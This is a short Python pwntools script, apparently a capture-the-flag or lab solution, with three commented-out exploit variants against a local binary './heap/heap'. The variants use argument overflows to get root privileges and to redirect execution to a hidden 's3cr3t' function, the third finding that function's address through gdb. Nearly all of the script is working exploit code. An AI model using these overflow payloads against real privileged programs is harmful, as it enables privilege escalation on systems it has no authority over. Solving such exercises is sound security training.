path = './heap/heap'
import re
import os

#expl1 for root privileges 
'''
from pwn import process
p= process([path, b'\x01'*0x11])
p.interactive()
'''
#expl 2 with prints
'''
from pwn import process,gdb 
p= process([path, b'A'*0x10 + b'\x01' + b'\x02\x03\x04\x05\x06\x07\x08'+b'\x64\x53\x55\x55\x55\x55'])
p.interactive()
'''
'''
#expl 3 without prints
from pwn import p64,gdb,process
p= process([path, b'A'*0x10 + b'\x01'])
gdb.attach(p,"b main\nr\nset logging on\n disas s3cr3t\nexit")
with open("gdb.txt") as f: addr = [i.group() for i in re.finditer(r'0x[\da-zA-Z]+',f.readlines()[1])][0]
p.close()
os.remove('gdb.txt')
print(addr)
print(p64(int(addr,16)).replace(b'\x00',b''))
p = process([path, b'A'*0x10 + b'\x01'+ b'A'*7 + p64(int(addr,16)).replace(b'\x00',b'')])
p.interactive()
#0x00005555555552a5
#0x555555555318
'''